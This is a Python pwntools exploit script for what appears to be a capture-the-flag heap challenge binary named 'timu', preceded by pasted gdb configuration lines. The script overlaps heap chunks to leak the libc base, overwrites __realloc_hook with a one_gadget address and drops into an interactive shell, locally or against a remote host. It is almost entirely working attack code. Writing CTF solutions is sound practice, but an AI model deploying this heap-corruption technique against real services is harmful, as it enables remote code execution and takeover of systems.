#!/usr/bin/env python2
# -*- coding: utf-8 -*-
source ~/.pwn_env/peda/peda.py
source ~/.pwn_env/Pwngdb/pwngdb.py
source ~/.pwn_env/Pwngdb/angelheap/gdbinit.py
source ~/.pwn_env/anthraxx.pwndbg
#set context-code-lines 5
#set context-clear-screen on


define hook-run
python
import angelheap
angelheap.init_angelheap()
end
end


set directories /usr/lib/glibc/glibc-source/glibc-2.23/malloc/
from pwn import *

local = 1
link = ''
host,port = map(str.strip, link.split(':')) if link != '' else ("",0)
context.log_level = 'debug'
#context.terminal = "/home/noone/hyperpwn/hyperpwn-client.sh"
context.terminal =  ['mate-terminal','--geometry=94x60--10-26','--hide-menubar', '-x','sh','-c',]
exe = './timu'
context.binary = exe
elf = ELF(exe)
libc = elf.libc


#don't forget to change it
if local:
    io = process(exe)
else:
    io = remote(host,port)

s    = lambda data                                    : io.send(str(data))
sa   = lambda delim,data                              : io.sendafter(str(delim), str(data))
sl   = lambda data                                    : io.sendline(str(data))
sla  = lambda delim,data                              : io.sendlineafter(str(delim), str(data))
r    = lambda numb=4096                               : io.recv(numb)
rl   = lambda                                         : io.recvline().strip()
ru   = lambda delim,drop=True                         : io.recvuntil(delim, drop)
rg   = lambda regex                                   : io.recvregex(regex)
rp   = lambda timeout=1                               : io.recvrepeat(timeout)
uu32 = lambda data                                    : u32(data.ljust(4, '\x00'))
uu64 = lambda data                                    : u64(data.ljust(8, '\x00'))
lg   = lambda s,addr                                  : io.success('\033[1;31;40m%20s--> 0x%x\033[0m'%(s,addr))
ga   = lambda job=""                                  : gdb.attach(io, job) if local else 0
ia   = lambda                                         : io.interactive()

# break on aim addr
def debug(addr,PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        gdb.attach(io,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(io,"b *{}".format(hex(addr)))

# get_one_gadget
def get_one_gadget(filename):
    try:
        import subprocess
    except Exception as e:
        print("subprocess not install")
        exit(0)
    return map(int, subprocess.check_output(['one_gadget', '--raw', filename]).split(' '))



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

def choice(idx):
    def wrap(f):
        def go(*args, **kargs):
            sla(" :\n", idx)
            f(*args, **kargs)
        return go
    return wrap

@choice(idx=1)
def new(size, content):
    sla(": \n", size)
    sla(": \n", content)

@choice(idx=2)
def delete(idx):
    sla(": \n", idx)

@choice(idx=3)
def show():
    pass


def exp(host, rce=False):
    if rce:
        one_gadget = get_one_gadget(libc.path)
    
    new(0x4f0, "a") #0
    new(0x18, "a") #1
    new(0x18, "a") #2
    new(0x4f0, "a") #3
    new(0x18, "a") #4
    delete(0)
    delete(2)
    new(0x18, "a"*0x10 + p64(0x500+0x20+0x20)) #0
    delete(3)
    new(0x4f0, "A") #2
    show()
    ru("1 : ")
    libc.address = uu64(r(6)) - 0x3ebca0
    lg("libc", libc.address)
    new(0x18, "a") #3
    delete(3)
    delete(1)
    new(0x18, p64(libc.sym['__realloc_hook']))
    #new(0x18, p64(libc.sym['__malloc_hook']))
    new(0x18, "a")
    #new(0x18, p64(0xAAAAAAAA))
    new(0x18, p64(libc.address+one_gadget[0]) + p64(libc.sym['realloc']+2))
    sl("1")
    sl("1")
    #ga()
    '''                         
    try:
        from LibcSearcher import *
    except Exception as e:
        print("LibcSearcher not install")
        exit(0)        
    obj = LibcSearcher("fgets",leak_addr)
    libc_base = leak_addr - obj.dump("fgets")  
    system_addr = libc_base + obj.dump("system")
    malloc_hook = libc_base + obj.dump("__malloc_hook")
    free_hook = libc_base + obj.dump("__free_hook")
    bin_sh_addr = libc_base + obj.dump("str_bin_sh")
    '''
    ia()

if __name__ == '__main__':
    exp(host,True)

